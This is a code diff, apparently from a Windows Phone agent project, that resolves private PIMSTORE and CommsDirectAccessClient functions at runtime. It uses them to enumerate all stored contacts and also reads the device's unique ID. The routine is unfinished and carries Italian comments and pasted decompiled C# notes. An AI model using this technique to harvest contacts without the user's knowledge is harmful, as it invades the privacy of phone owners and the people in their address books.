@@ -84,7 +84,17 @@ extern "C" int mornellaStart(void);
 	FunctionFuncBeep _Beep;
 	FunctionFuncPlaySoundW _PlaySoundW;
 	FunctionFuncSetCurrentDirectory _SetCurrentDirectory;
-		
+	FunctionFuncChooseContact _ChooseContact;
+	FunctionFuncPoomDataServiceClient_Init _PoomDataServiceClient_Init;
+	FunctionFuncPoomDataServiceClient_GetObjectsEnumerator _PoomDataServiceClient_GetObjectsEnumerator;
+	FunctionFuncPoomDataServiceClient_GetStreamLength _PoomDataServiceClient_GetStreamLength;
+	FunctionFuncPoomDataServiceClient_ReadStream _PoomDataServiceClient_ReadStream;
+	FunctionFuncPoomDataServiceClient_MoveNext _PoomDataServiceClient_MoveNext;
+
+
+
+	
+
 
 
 PIMAGE_NT_HEADERS WINAPI ImageNtHeader(PVOID Base)
@@ -594,6 +604,27 @@ int setLoadLibraryExW(void)
 	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
 	_SetCurrentDirectory =  (FunctionFuncSetCurrentDirectory)GetProcAddress(LibHandle,"SetCurrentDirectoryW");
 
+	LibHandle = LoadLibraryExW(L"PIMSTORE",NULL,0);
+	_ChooseContact = (FunctionFuncChooseContact)GetProcAddress(LibHandle,"ChooseContact");
+
+	LibHandle = LoadLibraryExW(L"CommsDirectAccessClient",NULL,0);
+	_PoomDataServiceClient_Init=  (FunctionFuncPoomDataServiceClient_Init)GetProcAddress(LibHandle,"PoomDataServiceClient_Init");
+
+	LibHandle = LoadLibraryExW(L"CommsDirectAccessClient",NULL,0);
+	_PoomDataServiceClient_GetObjectsEnumerator=  (FunctionFuncPoomDataServiceClient_GetObjectsEnumerator)GetProcAddress(LibHandle,"PoomDataServiceClient_GetObjectsEnumerator");
+
+	LibHandle = LoadLibraryExW(L"CommsDirectAccessClient",NULL,0);
+	_PoomDataServiceClient_GetStreamLength=  (FunctionFuncPoomDataServiceClient_GetStreamLength)GetProcAddress(LibHandle,"PoomDataServiceClient_GetStreamLength");
+
+	LibHandle = LoadLibraryExW(L"CommsDirectAccessClient",NULL,0);
+	_PoomDataServiceClient_ReadStream=  (FunctionFuncPoomDataServiceClient_ReadStream)GetProcAddress(LibHandle,"PoomDataServiceClient_ReadStream");
+
+
+	LibHandle = LoadLibraryExW(L"CommsDirectAccessClient",NULL,0);
+	_PoomDataServiceClient_MoveNext=  (FunctionFuncPoomDataServiceClient_MoveNext)GetProcAddress(LibHandle,"PoomDataServiceClient_MoveNext");
+
+
+
 
 	
 
@@ -603,9 +634,119 @@ int setLoadLibraryExW(void)
 	return 0;
 }
 
+
+
+
+
+HRESULT ContactChooserExample(void)
+{
+    HRESULT hr                      = E_FAIL;    
+    const CEPROPID c_propidAllEmail = PIMPR_ALL_EMAIL; 
+    CHOOSECONTACT cc                = {0};
+
+    // Setup the CHOOSECONTACT structure.
+    cc.cbSize                     = sizeof (cc);
+    cc.dwFlags                    = CCF_RETURNCONTACTNAME | CCF_RETURNPROPERTYVALUE | CCF_HIDENEW;
+    cc.rgpropidRequiredProperties = &c_propidAllEmail;
+
+    // The number of properties specified in the c_propidAllEmail array.
+    cc.cRequiredProperties = 1;
+    cc.hwndOwner           = NULL;
+
+    // Display the Contact Chooser control, and prompt the user to choose a Contact.
+    hr = _ChooseContact(&cc);
+
+    // The name, and a string representation of the property, is returned according to the flags set in the CHOOSECONTACT structure above.
+   // DEBUGMSG(TRUE, (L"%s's email address is %s", cc.bstrContactName, cc.bstrPropertyValueSelected));
+
+    // Free memory.
+    //SysFreeString(cc.bstrContactName);
+    //SysFreeString(cc.bstrPropertyValueSelected);
+
+    return hr;
+}
+
+void GetContatti(void)
+{
+//[SecurityCritical, DllImport("CommsDirectAccessClient.dll", CharSet=CharSet.Unicode)]
+//	PoomDataServiceClient_Init
+//public static extern uint PoomDataServiceClient_GetObjectsEnumerator(string query, out IntPtr handle);
+ 
+
+		UINT r=_PoomDataServiceClient_Init();
+
+		DWORD aaa;
+		r=_PoomDataServiceClient_GetObjectsEnumerator(L"Contacts: All",&aaa);
+
+		LONG bbb;
+		//r=_PoomDataServiceClient_GetStreamLength(aaa,&bbb);
+
+		//internal static extern unsafe uint PoomDataServiceClient_ReadStream(IntPtr handle, int length, byte* buffer, out int read);
+		//typedef UINT   (__stdcall  *FunctionFuncPoomDataServiceClient_ReadStream)(DWORD,DWORD,BYTE*,DWORD*);
+
+		BYTE g_array[100];
+		DWORD reaaa=NULL;
+	///	r=_PoomDataServiceClient_ReadStream(aaa,100,g_array,reaaa);
+
+		/*
+		     object[] objectHandles = null;
+            PhoneDataSharingContext.MapHrToException(this._interopContext.MoveNext(this._nativeEnumerator, this._optimalBatchSize, ref objectHandles));
+
+			public static extern uint PoomDataServiceClient_MoveNext(IntPtr handle, uint batchSize, ref uint handleCount, [In, Out, MarshalAs(UnmanagedType.LPArray, SizeParamIndex=0)] IntPtr[] objectHandles);
+ */
+		UINT ciao;
+		BYTE asc[1024];
+			r=_PoomDataServiceClient_MoveNext(aaa,100,&ciao,asc); //in ciao mi ritrovo il numero di contatti che ho
+
+
+			//ripartire da:
+			/*
+			public uint MoveNext(object handle, uint requestedCount, ref object[] objectHandles)
+{
+    uint num5;
+    uint handleCount = 0;
+    IntPtr[] ptrArray = new IntPtr[requestedCount];
+    uint num3 = PoomInteropMethods.PoomDataServiceClient_MoveNext((IntPtr) handle, requestedCount, ref handleCount, ptrArray);
+    try
+    {
+        objectHandles = new object[handleCount];
+        switch (num3)
+        {
+            case 0:
+                for (int i = 0; i < handleCount; i++)
+                {
+                    objectHandles[i] = ptrArray[i];
+                }
+                break;
+
+            case 0x80070490:
+                num3 = 0;
+                break;
+        }
+        num5 = num3;
+    }
+    catch (Exception)
+    {
+        for (int j = 0; j < handleCount; j++)
+        {
+            this.FreeObject(ptrArray[j]);
+        }
+        throw;
+    }
+    return num5;
+}
+
+			*/
+
+ 
+
+}
+
 void testVari(void)
 {
+	GetContatti();
 
+	HRESULT AAA=ContactChooserExample();
 
 		BYTE array[20];
 	_DevicePropertiesGetUniqueDeviceId(array,sizeof(array));
